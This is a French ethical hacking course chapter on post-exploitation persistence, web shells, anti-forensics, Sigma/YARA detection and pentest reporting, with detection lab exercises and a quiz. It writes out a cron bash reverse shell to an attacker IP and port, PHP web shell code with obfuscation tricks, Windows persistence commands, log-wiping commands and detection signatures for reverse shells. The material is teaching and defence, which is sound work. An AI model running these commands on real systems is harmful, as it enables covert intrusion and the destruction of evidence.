@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics &amp; Rapport de Pentest | Hacking Éthique &amp; Pentest B3</title>
+<meta name="description" content="Module 6 du cours Hacking Éthique &amp; Pentest B3 : Mécanismes de persistance et maintien de l'accès (web shells obfusqués, tâches cron, services d'arrière-plan, clés SSH autorisées, clés de registre Run/RunOnce sous Windows), techniques de dissimulation et d'anti-forensics (timestomping, altération de journaux d'événements syslog et wevtutil), compréhension des contre-mesures défensives (SIEM, EDR, règles Sigma et signatures YARA), méthodologie de rédaction du rapport de test d'intrusion professionnel, synthèse managériale (Executive Summary) et plan de remédiation priorisé. Notions clés, démonstrations, ateliers de code interactifs, QCM corrigés.">
+<link rel="canonical" href="https://revi-mu.vercel.app/b3-hacking/chapitres/chapitre6.html">
+<meta property="og:title" content="Module 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics &amp; Rapport de Pentest | Hacking Éthique &amp; Pentest B3">
+<meta property="og:description" content="Module 6 du cours Hacking Éthique &amp; Pentest B3 : Mécanismes de persistance et maintien de l'accès (web shells obfusqués, tâches cron, services d'arrière-plan, clés SSH autorisées, clés de registre Run/RunOnce sous Windows), techniques de dissimulation et d'anti-forensics (timestomping, altération de journaux d'événements syslog et wevtutil), compréhension des contre-mesures défensives (SIEM, EDR, règles Sigma et signatures YARA), méthodologie de rédaction du rapport de test d'intrusion professionnel, synthèse managériale (Executive Summary) et plan de remédiation priorisé. Notions clés, démonstrations, ateliers de code interactifs, QCM corrigés.">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="/assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="/assets/css/tokens.css">
+<link rel="stylesheet" href="../assets/css/cours.css">
+<link rel="stylesheet" href="/assets/css/code-lab.css">
+<script src="/assets/js/theme.js"></script>
+</head>
+<body data-chapter="6">
+
+<nav class="skip-nav" aria-label="Accès rapide"><a href="#content" class="skip-link">Aller au contenu</a></nav>
+
+<nav class="b3-hackingnav"><div class="b3-hackingnav__in">
+  <a class="b3-hackingnav__home" href="/" title="Accueil — Tous les portails" aria-label="Accueil — Tous les portails"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-house"></use></svg> <span>Portail</span></a>
+  <span class="b3-hackingnav__sep" aria-hidden="true">/</span>
+  <a class="b3-hackingnav__brand" href="../index.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-shield"></use></svg> Hacking Éthique &amp; Pentest B3</a>
+  <div class="b3-hackingnav__links">
+    <a href="../sommaire.html">Sommaire</a>
+    <a href="../chapitres/chapitre1.html">Ch. 1</a>
+    <a href="../chapitres/chapitre2.html">Ch. 2</a>
+    <a href="../chapitres/chapitre3.html">Ch. 3</a>
+    <a href="../chapitres/chapitre4.html">Ch. 4</a>
+    <a href="../chapitres/chapitre5.html">Ch. 5</a>
+    <a href="../chapitres/chapitre6.html" class="is-active">Ch. 6</a>
+    <a href="../chapitres/cartes.html">Cartes</a>
+    <a href="../chapitres/formules.html">Mémo</a>
+    <a href="../exercices/exercices.html">Exercices</a>
+    <a href="../atelier.html">Atelier</a>
+    <a href="../chapitres/simulateur-examen.html">Examen</a>
+  </div>
+  <div class="b3-hackingnav__actions">
+    <button type="button" class="theme-toggle" id="themeToggle" aria-label="Activer le mode sombre" title="Basculer le thème clair / sombre">
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+    </button>
+  </div>
+</div></nav>
+
+<main id="content" class="b3-hackingwrap">
+<p class="crumb"><a href="../index.html">Hacking Éthique & Pentest B3</a> › <a href="../sommaire.html">Sommaire</a> › Chapitre 6</p>
+
+<h1>Chapitre 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics & Rapport de Pentest</h1>
+
+<div class="chapmeta">
+    <span class="tag">Module 6</span>
+    <span class="tag tag--time">≈ 2 h 45 de travail</span>
+    <span class="tag tag--time">Réservé B3 et plus</span>
+  </div>
+
+  <div class="box box--situation">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-play"></use></svg> Mise en situation</div>
+    <p>Un test d'intrusion ne s'achève pas lorsqu'un accès root est obtenu : sa valeur ajoutée réside intégralement dans la qualité du rapport délivré au client et dans l'évaluation de la capacité défensive de l'organisation. Un rapport incompréhensible pour la direction ou un nettoyage négligé laissant des backdoors actives sur les serveurs de production ruine la crédibilité de l'auditeur. En tant qu'expert en cybersécurité B3, vous devez maîtriser les techniques de persistance et de post-exploitation pour évaluer la réactivité du SOC, nettoyer scrupuleusement vos implants, et rédiger un rapport d'audit d'excellence articulant synthèse managériale percutante et fiches de remédiation technique actionnables.</p>
+  </div>
+
+  <div class="box box--objectifs">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-target"></use></svg> Objectifs pédagogiques</div>
+    <p>À la fin de ce chapitre, tu seras capable de :</p>
+    <ol>
+      <li>analyser les mécanismes de persistance sous Linux (cron, systemd, authorized_keys) et Windows (Run keys, services) ;</li>
+      <li>détecter et désobfusquer les web shells PHP/JSP exploitant des fonctions d'évaluation dynamique ;</li>
+      <li>comprendre les techniques d'anti-forensics (timestomping, effacement de logs) et leur détection par la Blue Team ;</li>
+      <li>analyser les règles de détection comportementale modernes : règles Sigma pour SIEM et règles YARA pour fichiers ;</li>
+      <li>structurer un rapport de test d'intrusion complet conforme aux standards de l'industrie (PTES) ;</li>
+      <li>rédiger un Executive Summary managérial et un plan de remédiation priorisé (immédiat, court terme, moyen terme).</li>
+    </ol>
+  </div>
+
+<h2>1. Persistance &amp; Maintien de l'Accès (Linux &amp; Windows)</h2>
+
+<p>La persistance garantit qu'un redémarrage de la machine ou une coupure de session n'interrompt pas l'accès obtenu par l'auditeur ou l'attaquant :</p>
+<div class="grid grid-2">
+  <div class="card">
+    <h4>Mécanismes de Persistance Linux</h4>
+    <ul>
+      <li><strong>Clés SSH autorisées :</strong> injection de la clé publique de l'auditeur dans <code>~/.ssh/authorized_keys</code> ou <code>/root/.ssh/authorized_keys</code> pour des reconnexions directes.</li>
+      <li><strong>Tâches Crontab :</strong> création d'une entrée planifiée dans <code>/etc/cron.d/</code> exécutant périodiquement un reverse shell (ex: <code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>).</li>
+      <li><strong>Unités Systemd :</strong> création d'un service persistant avec redémarrage automatique (<code>Restart=always</code>) dans <code>/etc/systemd/system/</code>.</li>
+      <li><strong>Fichiers de profil shell :</strong> ajout de commandes masquées à la fin de <code>/etc/profile</code> ou <code>~/.bashrc</code> exécutées à chaque connexion d'un administrateur.</li>
+    </ul>
+  </div>
+  <div class="card">
+    <h4>Mécanismes de Persistance Windows</h4>
+    <ul>
+      <li><strong>Clés de Registre Run / RunOnce :</strong> <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> (exécuté à l'ouverture de session de l'utilisateur).</li>
+      <li><strong>Tâches Planifiées (Task Scheduler) :</strong> création d'une tâche via la commande <code>schtasks /create /sc onlogon /tn "Update" /tr "payload.exe"</code>.</li>
+      <li><strong>Services Windows persistants :</strong> création d'un service système avec démarrage automatique via <code>sc create PersistentSvc binpath= "C:\implant.exe" start= auto</code>.</li>
+      <li><strong>Dossier de Démarrage (Startup) :</strong> dépôt d'un binaire ou raccourci dans <code>shell:startup</code>.</li>
+    </ul>
+  </div>
+</div>
+
+<h2>2. Web Shells &amp; Détection de l'Obfuscation</h2>
+
+<p>Sur les serveurs web, le dépôt d'un web shell constitue la porte dérobée applicative la plus fréquente :</p>
+<div class="grid grid-2">
+  <div class="card">
+    <h4>Anatomie d'un Web Shell PHP</h4>
+    <p>Forme minimale non obfusquée :</p>
+    <pre><code>&lt;?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?&gt;</code></pre>
+    <p>Fonctions d'exécution système surveillées : <code>system()</code>, <code>passthru()</code>, <code>shell_exec()</code>, <code>exec()</code>, <code>popen()</code>, <code>proc_open()</code>.</p>
+  </div>
+  <div class="card">
+    <h4>Techniques d'Obfuscation</h4>
+    <p>Pour contourner les antivirus et scanners de fichiers (WAF/EDR) :</p>
+    <ul>
+      <li>Encodage Base64 et compression : <code>eval(gzinflate(base64_decode($payload)));</code></li>
+      <li>Concaténation dynamique de chaînes : <code>$a = "sys"."tem"; $a($_GET["x"]);</code></li>
+      <li>Variables variables et fonctions anonymes : <code>$_="assert"; $_($_POST["c"]);</code></li>
+    </ul>
+  </div>
+</div>
+
+<h2>3. Dissimulation, Anti-Forensics &amp; Nettoyage d'Implants</h2>
+
+<p>L'étape 5 du hacking éthique évalue les traces laissées et procède au nettoyage scrupuleux de l'environnement :</p>
+<div class="grid grid-3">
+  <div class="card">
+    <h4>Timestomping (Horodatage)</h4>
+    <p>Modification délibérée des horodatages MACB (Modification, Access, Creation, Birth) d'un fichier malveillant pour les aligner sur des binaires système légitimes (ex: <code>touch -r /bin/ls /tmp/implant</code>).</p>
+    <p>Complique la chronologie des analystes forensiques (DFIR).</p>
+  </div>
+  <div class="card">
+    <h4>Gestion des Journaux d'Événements</h4>
+    <p>Les attaquants tentent d'effacer leurs traces dans l'historique shell (<code>history -c</code>, <code>unset HISTFILE</code>) ou dans les journaux Windows (<code>wevtutil cl Security</code>).</p>
+    <p>La Blue Team détecte cet effacement brutal comme une alerte critique majeure.</p>
+  </div>
+  <div class="card">
+    <h4>Protocole de Nettoyage (Cleanup)</h4>
+    <p>Règle d'or du pentest : <strong>tous les artefacts déposés doivent être supprimés</strong> à la fin de la mission.</p>
+    <p>Suppression des comptes de test créés, des clés SSH ajoutées, des scripts web shells et des tâches planifiées.</p>
+  </div>
+</div>
+
+<h2>4. Détection Moderne de la Blue Team : SIEM, EDR, Sigma &amp; YARA</h2>
+
+<p>L'équipe défensive déploie des outils de surveillance pour intercepter les tactiques offensives :</p>
+<div class="grid grid-2">
+  <div class="card">
+    <h4>Règles Sigma (Détection de Logs SIEM)</h4>
+    <p>Format standardisé et agnostique pour décrire des comportements d'attaque dans les journaux système :</p>
+    <pre><code>title: Détection d'accès au fichier shadow via commande anormale
+logsource:
+    category: process_creation
+    product: linux
+detection:
+    selection:
+        CommandLine|contains: '/etc/shadow'
+    condition: selection
+level: critical</code></pre>
+  </div>
+  <div class="card">
+    <h4>Règles YARA (Détection de Fichiers &amp; Binaires)</h4>
+    <p>Outil d'identification et de classification de malwares basé sur des signatures textuelles ou binaires :</p>
+    <pre><code>rule Webshell_PHP_Eval_Base64 {
+    strings:
+        $eval = "eval(" ascii
+        $b64 = "base64_decode" ascii
+        $req = "$_POST" ascii
+    condition:
+        all of them
+}</code></pre>
+  </div>
+</div>
+
+<h2>5. Structure Normalisée du Rapport de Test d'Intrusion Professionnel</h2>
+
+<p>Le rapport d'intrusion est l'unique livrable tangible de la mission. Il doit s'adresser simultanément aux décideurs et aux équipes techniques :</p>
+<table class="table">
+  <thead><tr><th>Partie du Rapport</th><th>Public Visé</th><th>Contenu Clé &amp; Exigences</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Synthèse Managériale (Executive Summary)</strong></td><td>Direction Générale, DSI, RSSI</td><td>Résumé non-technique (1 à 2 pages), niveau de risque global qualifié, cartographie des impacts métier, principaux constats et feuille de route budgétaire.</td></tr>
+    <tr><td><strong>Périmètre &amp; Méthodologie</strong></td><td>Responsables Sécurité, Auditeurs</td><td>Rappel des règles d'engagement (RoE), adresses IP/URLs cibles, dates et heures des tests, limitations rencontrées.</td></tr>
+    <tr><td><strong>Fiches Techniques de Vulnérabilités</strong></td><td>Administrateurs, Développeurs</td><td>Pour chaque faille : Titre, Score CVSS v3.1, description technique détaillée, preuve de concept (PoC éthique), captures d'écran et recommandation précise.</td></tr>
+    <tr><td><strong>Plan de Remédiation Priorisé</strong></td><td>Chefs de projets, Équipes Opérationnelles</td><td>Matrice de priorisation classée par horizon : <em>Immédiat / Quick wins</em> (&lt; 48 h), <em>Court terme</em> (&lt; 30 j) et <em>Moyen/Long terme</em> (&lt; 90 j).</td></tr>
+  </tbody>
+</table>
+
+<!-- code-labs:start -->
+  <h2>6. Exercices de code</h2>
+  <p class="lead">Ces trois exercices se font dans la page. L’éditeur du navigateur exécute votre code
+  sur un service distant, puis la validation fait tourner des tests que vous ne voyez pas :
+  réussir l’exemple affiché ne suffit donc pas, il faut traiter le cas général.</p>
+  <p>En cas d’erreur, le bouton <strong>Expliquer mon erreur</strong> interroge le tuteur : il décrit ce qui
+  s’est passé et par où chercher, sans jamais écrire de code à votre place — c’est le principe de l’exercice.</p>
+<div class="lab" data-lab
+     data-exercise="hk3-c6-e1"
+     data-language="python"
+     data-height="300"
+     data-stdin="SCAN_SCRIPT code=&lt;?php if(isset($_REQUEST[&quot;cmd&quot;])){ system($_REQUEST[&quot;cmd&quot;]); } ?&gt;">
+  <script type="text/plain" data-lab-starter>import sys
+
+lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+
+# À compléter : calculer le score de suspicion de web shell
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 1 — Détecteur de Web Shells et Obfuscation de Scripts Malveillants</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n1">Niveau 1 — Acquisition</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Analyser le code d'un script web pour repérer la présence de web shells et de mécanismes d'obfuscation.</p>
+    <div class="lab__brief"><p>Un web shell est un script déposé sur un serveur permettant à l'attaquant d'exécuter des commandes système à distance.<br><br>
+Indicateurs recherchés et scoring de dangerosité :<br>
+- Exécution de commandes système (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) : +40 points.<br>
+- Évaluation dynamique de code (<code>eval</code>, <code>assert</code>) : +30 points.<br>
+- Fonctions d'obfuscation (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) : +20 points.<br>
+- Réception directe d'entrées non filtrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) : +20 points.<br><br>
+Classification finale :<br>
+- Si <code>score &gt;= 60</code> : <code>status=MALICIOUS_WEBSHELL</code>, <code>risk=CRITICAL</code>.<br>
+- Si <code>20 &lt;= score &lt; 60</code> : <code>status=SUSPICIOUS_SCRIPT</code>, <code>risk=MEDIUM</code>.<br>
+- Si <code>score &lt; 20</code> : <code>status=BENIGN_CODE</code>, <code>risk=LOW</code>.<br><br>
+Entrée STDIN : <code>SCAN_SCRIPT code=&lt;extrait_de_code&gt;</code>.<br>
+Sortie : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=&lt;status&gt; risk=&lt;risk&gt;</code>.</p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>SCAN_SCRIPT code=&lt;?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?&gt;</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL</pre></div>
+    </div>
+    <p class="lab__note">Web shell PHP classique à une ligne combinant system et $_REQUEST.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Extrayez le code après "code=" avec line.split("code=", 1)[1].</li>
+        <li>Testez la présence des différentes familles de mots-clés.</li>
+        <li>Attribuez la classification selon les seuils 60 et 20.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+
+<div class="lab" data-lab
+     data-exercise="hk3-c6-e2"
+     data-language="python"
+     data-height="300"
+     data-stdin="PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1">
+  <script type="text/plain" data-lab-starter>import sys
+
+lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+
+# À compléter : détecter les reverse shells dans les persistances
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 2 — Analyseur de Persistance Linux (Crontab &amp; Reverse Shells)</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n2">Niveau 2 — Application</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Auditer les mécanismes de persistance et détecter les commandes de shell inverse (Reverse Shell).</p>
+    <div class="lab__brief"><p>Après obtention d'un accès initial, l'attaquant configure une tâche planifiée ou un script de démarrage pour maintenir sa connexion.<br><br>
+Signatures d'attaques surveillées :<br>
+1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>
+2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>
+3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>
+4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>
+Règles de diagnostic :<br>
+- Si l'une des signatures est présente :<br>
+  <code>malicious=TRUE</code>, <code>signature=&lt;NOM_SIGNATURE&gt;</code>, <code>risk=CRITICAL</code>.<br>
+- Sinon :<br>
+  <code>malicious=FALSE</code>, <code>signature=CLEAN</code>, <code>risk=LOW</code>.<br><br>
+Entrée STDIN : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>
+Sortie : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=&lt;TRUE|FALSE&gt; signature=&lt;sig&gt; risk=&lt;risk&gt;</code>.</p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL</pre></div>
+    </div>
+    <p class="lab__note">Tâche cron récurrente établissant un reverse shell interactif vers l'attaquant.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Extrayez la commande avec line.split("command=", 1)[1].</li>
+        <li>Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.</li>
+        <li>Formatez la sortie PERSIST_RESULT.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+
+<div class="lab" data-lab
+     data-exercise="hk3-c6-e3"
+     data-language="python"
+     data-height="300"
+     data-stdin="PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW">
+  <script type="text/plain" data-lab-starter>import sys
+
+lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+
+# À compléter : générer la synthèse managériale de pentest
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 3 — Générateur de Synthèse Managériale et Matrice de Risque de Pentest</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n3">Niveau 3 — Raisonnement</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Agréger les vulnérabilités découvertes, calculer le score de risque global et qualifier la posture de sécurité.</p>
+    <div class="lab__brief"><p>Le rapport d'intrusion conclut chaque mandat de pentest par une synthèse managériale (Executive Summary) et une matrice de sévérité.<br><br>
+Pondération du score de risque :<br>
+- <code>CRITICAL</code> : 10 points chacun.<br>
+- <code>HIGH</code> : 5 points chacun.<br>
+- <code>MEDIUM</code> : 2 points chacun.<br>
+- <code>LOW</code> : 1 point chacun.<br>
+<code>risk_score = (C * 10) + (H * 5) + (M * 2) + (L * 1)</code>.<br><br>
+Qualification de la posture globale de l'organisation :<br>
+1. Si <code>C &gt;= 1</code> ou <code>risk_score &gt;= 25</code> : <code>posture=COMPROMISED_CRITICAL</code>.<br>
+2. Sinon si <code>H &gt;= 2</code> ou <code>risk_score &gt;= 15</code> : <code>posture=HIGH_EXPOSURE</code>.<br>
+3. Sinon si <code>risk_score &gt;= 5</code> : <code>posture=MODERATE_EXPOSURE</code>.<br>
+4. Sinon : <code>posture=SECURE_RESILIENT</code>.<br><br>
+Entrée STDIN : <code>PENTEST_SYNTHESIS findings=&lt;f1:sev1,f2:sev2,...&gt;</code>.<br>
+Sortie :<br>
+<code>PENTEST_SUMMARY: total_findings=&lt;N&gt; critical=&lt;C&gt; high=&lt;H&gt; medium=&lt;M&gt; low=&lt;L&gt; risk_score=&lt;score&gt; posture=&lt;posture&gt;</code>.</p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>PENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL</pre></div>
+    </div>
+    <p class="lab__note">Une vulnérabilité critique déclenche immédiatement la posture COMPROMISED_CRITICAL.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Comptez les occurrences de CRITICAL, HIGH, MEDIUM, LOW dans findings.</li>
+        <li>Calculez le score pondéré (10, 5, 2, 1).</li>
+        <li>Appliquez les conditions de qualification de posture.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+  <!-- code-labs:end -->
+  <h2>7. QCM — niveau examen</h2>
+
+  <div class="qcm">
+    <div class="q">
+      <p class="q__stem">Quel est l'objectif premier de la Synthèse Managériale (Executive Summary) dans un rapport de test d'intrusion ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Vulgariser les résultats de l'audit et l'impact métier pour les décideurs et la direction sans jargon technique excessif</button>
+        <button class="opt">Copier-coller l'intégralité des sorties brutes des scans Nmap pour prouver le travail accompli</button>
+        <button class="opt">Fournir des exploits prêts à l'emploi pour attaquer les concurrents</button>
+        <button class="opt">Remplacer le contrat de mandat en cas de litige judiciaire</button>
+      </div>
+      <div class="q__exp">L'Executive Summary s'adresse aux décideurs (membres du comité de direction, DSI, RSSI) : il synthétise le niveau de risque global, les conséquences métier et les investissements de remédiation requis.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quel mécanisme sous Linux permet à un attaquant de maintenir un accès persistant en s'authentifiant par clé publique sans mot de passe ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">L'ajout de sa clé publique dans le fichier ~/.ssh/authorized_keys</button>
+        <button class="opt">La modification du fichier /etc/resolv.conf</button>
+        <button class="opt">L'effacement du binaire /bin/bash</button>
+        <button class="opt">L'activation du protocole Telnet sur le port 23</button>
+      </div>
+      <div class="q__exp">Le fichier authorized_keys répertorie les clés publiques autorisées à ouvrir une session SSH : y déposer sa clé garantit un accès persistant immédiat sans nécessiter le mot de passe du compte.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quelle clé de registre Windows est couramment exploitée par les malwares pour persister et s'exécuter automatiquement à l'ouverture de session utilisateur ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</button>
+        <button class="opt">HKLM\SYSTEM\CurrentControlSet\Services\Tcpip</button>
+        <button class="opt">HKCR\.txt</button>
+        <button class="opt">HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall</button>
+      </div>
+      <div class="q__exp">Les clés de registre Run et RunOnce exécutent les programmes qui y sont référencés à chaque ouverture de session de l'utilisateur, constituant le vecteur de persistance le plus classique sous Windows.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Qu'est-ce que la technique d'anti-forensics appelée "Timestomping" ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">La modification volontaire des dates et heures de création/modification d'un fichier malveillant pour le fondre parmi les fichiers système légitimes</button>
+        <button class="opt">L'accélération de l'horloge matérielle du processeur pour dépasser les quotas réseau</button>
+        <button class="opt">L'effacement physique des disques durs à l'aide d'un aimant</button>
+        <button class="opt">Le blocage des requêtes NTP sur le réseau local</button>
+      </div>
+      <div class="q__exp">Le timestomping altère les attributs d'horodatage (MACB) d'un implant pour lui donner la même date qu'un fichier système voisin (ex: 2018), trompant les recherches par date des analystes de réponse à incident.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quel est le rôle d'une règle YARA en cybersécurité défensive ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Identifier et classifier des fichiers malveillants ou web shells en analysant la présence de chaînes textuelles ou motifs binaires spécifiques</button>
+        <button class="opt">Chiffrer les disques durs des serveurs de production</button>
+        <button class="opt">Créer des tunnels VPN entre deux datacenters distants</button>
+        <button class="opt">Générer des clés d'activation logicielles</button>
+      </div>
+      <div class="q__exp">YARA est l'outil de référence pour la détection de malwares : il permet aux analystes de concevoir des signatures identifiant des familles d'implants sur la base de chaînes de caractères et de motifs hexadécimaux.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Pourquoi l'effacement brutal de l'intégralité des journaux de sécurité Windows (wevtutil cl Security) est-il paradoxalement très risqué pour un attaquant furtif ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Parce que le vidage d'un journal génère obligatoirement l'événement critique 1102 ("The audit log was cleared") qui alerte immédiatement le SIEM/SOC</button>
+        <button class="opt">Parce que cette commande réinitialise immédiatement le mot de passe du domaine</button>
+        <button class="opt">Parce que Windows refuse d'exécuter cette commande même avec des privilèges SYSTEM</button>
+        <button class="opt">Parce que cela supprime les fichiers système Windows et fait crasher l'ordinateur</button>
+      </div>
+      <div class="q__exp">Le vidage du journal d'audit de sécurité génère un événement spécifique (Event ID 1102) que tout SOC surveille avec la plus haute priorité : c'est un indicateur de compromission (IoC) flagrant.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">À quel horizon de temps les recommandations qualifiées de "Quick Wins" dans un plan de remédiation doivent-elles être appliquées ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Immédiat (moins de 24 à 48 heures) car elles sont simples à déployer et neutralisent les risques critiques majeurs</button>
+        <button class="opt">Dans 3 à 5 ans après renouvellement complet du parc informatique</button>
+        <button class="opt">Uniquement si le budget annuel de sécurité est excédentaire</button>
+        <button class="opt">Après avoir réécrit entièrement l'application en langage assembleur</button>
+      </div>
+      <div class="q__exp">Les Quick Wins représentent des actions correctives à très fort impact et faible complexité (ex: révoquer un binaire SUID inutile, corriger un enregistrement SPF) à déployer sous 24 à 48 heures.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Pourquoi la phase de nettoyage (Cleanup) des artefacts est-elle une exigence éthique et contractuelle absolue pour l'auditeur de sécurité ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Pour ne laisser aucune porte dérobée, compte de test ou binaire malveillant susceptible d'être réexploité ultérieurement par un véritable cybercriminel</button>
+        <button class="opt">Pour que le client ne puisse pas reproduire les tests effectués</button>
+        <button class="opt">Pour économiser de l'espace disque sur le serveur du client</button>
+        <button class="opt">Pour éviter de devoir rédiger les fiches techniques du rapport</button>
+      </div>
+      <div class="q__exp">Tout implant, compte ou web shell oublié par l'auditeur devient une vulnérabilité supplémentaire sur le système client qui pourrait être découverte et exploitée par un acteur malveillant.</div>
+    </div>
+  </div>
+
+<h2>8. Erreurs classiques — récapitulatif</h2>
+
+  <div class="box box--pitfall">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-warning"></use></svg> À reconnaître en examen</div>
+    <ul>
+      <li>Oublier de nettoyer tous les implants, web shells et comptes de test à l'issue de la mission de pentest.</li>
+      <li>Rédiger un rapport d'intrusion exclusivement technique sans synthèse managériale adaptée aux décideurs.</li>
+      <li>Proposer des recommandations vagues ("Mettre à jour les systèmes") plutôt qu'un plan d'action priorisé par horizon.</li>
